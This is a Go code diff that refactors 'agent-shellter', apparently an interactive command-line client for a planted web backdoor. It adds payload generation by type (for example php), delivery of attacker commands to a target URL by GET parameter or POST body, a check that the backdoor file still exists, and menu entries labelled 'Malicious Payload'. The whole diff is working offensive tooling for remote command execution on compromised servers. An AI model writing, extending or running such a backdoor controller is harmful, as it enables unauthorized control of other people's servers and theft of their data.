@@ -2,9 +2,11 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
-	"net/http"
+	"os"
 	"strings"
+
+	payload "agent-shellter/payload"
+	request "agent-shellter/request"
 
 	prompt "github.com/c-bata/go-prompt"
 )
@@ -13,16 +15,22 @@ var (
 	Url      string
 	Cmd      string
 	InParams string
+	Type     string
 )
+
+/* terminal mode*/
 var LivePrefixState struct {
 	LivePrefix string
 	IsEnable   bool
 }
 
+/* Execute mode from terminal*/
 func executor(in string) {
 	in = strings.TrimSpace(in)
 	blocks := strings.Split(in, " ")
 	switch blocks[0] {
+
+	/*	vuln url posible to rce payload */
 	case "url":
 		if len(blocks) < 2 {
 			fmt.Println("please set query, Example : url localhost/test.php")
@@ -32,19 +40,28 @@ func executor(in string) {
 		Url = blocks[1]
 		fmt.Println("[+] Set url backdoor : ", Url)
 
+	/* command for shell execute in target machine*/
 	case "command":
 		if len(blocks) < 2 {
 			fmt.Println("please set query, Example : command ls")
 			return
 		}
 
+		interactCommand := strings.Split(in, "command")
 		command := blocks[1]
 		if InParams == "yes" {
 			url := Url + command
-			doRequest(url)
+			request.DoRequest(url)
 			return
 		}
 
+		malpaylaoad := payload.GenPayload(Type, interactCommand[1])
+		request.DoPostRequestPayloadInBody(Url, malpaylaoad)
+		return
+
+	/*  if params is 'yes' payload will deliver in paramsurl
+	 *  if params is no you can customize the payload format
+	 */
 	case "params":
 		if len(blocks) < 2 {
 			InParams = "no"
@@ -55,14 +72,28 @@ func executor(in string) {
 		fmt.Println("[+] Set Params : ", InParams)
 		return
 
+	/* Check url is still exist or not*/
 	case "connect":
-		doCheckFileBackdoor(Url)
+		request.DoCheckFileBackdoor(Url)
+		return
+
+	case "type":
+		if len(blocks) < 2 {
+			fmt.Println("please set query, Example : type php")
+			return
+		}
+		Type = blocks[1]
+		fmt.Println("[+] Set type : ", Type)
+		return
+
+	case "exit":
+		os.Exit(1)
 		return
 
 	}
 
 	if in == "" {
-		LivePrefixState.IsEnable = false
+		LivePrefixState.IsEnable = true
 		LivePrefixState.LivePrefix = in
 		return
 	}
@@ -77,45 +108,14 @@ func completer(in prompt.Document) []prompt.Suggest {
 		{Text: "command", Description: "Malicious Payload "},
 		{Text: "params", Description: "Payload position "},
 		{Text: "connect", Description: "check backdoor file "},
+		{Text: "type", Description: "type payload deliver example : type php"},
+		{Text: "exit", Description: "exit shellter"},
 	}
 	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
 }
 
 func changeLivePrefix() (string, bool) {
 	return LivePrefixState.LivePrefix, LivePrefixState.IsEnable
-}
-
-func doCheckFileBackdoor(url string) {
-	fmt.Println("[+] Checking shellter file ..")
-	resp, err := http.Get(url)
-	if err != nil {
-		panic(err)
-	}
-	defer resp.Body.Close()
-
-	// Print the HTTP response status.
-	if resp.StatusCode == 200 {
-		fmt.Println("[+] Interactive shellter found !!")
-		return
-	}
-	fmt.Println("[!] Failed. Exploit Maybe no use")
-	return
-}
-
-func doRequest(url string) {
-	resp, err := http.Get(url)
-	if err != nil {
-		print(err)
-	}
-
-	defer resp.Body.Close()
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		print(err)
-	}
-
-	fmt.Print(string(body))
-	fmt.Println("\n")
 }
 
 func main() {
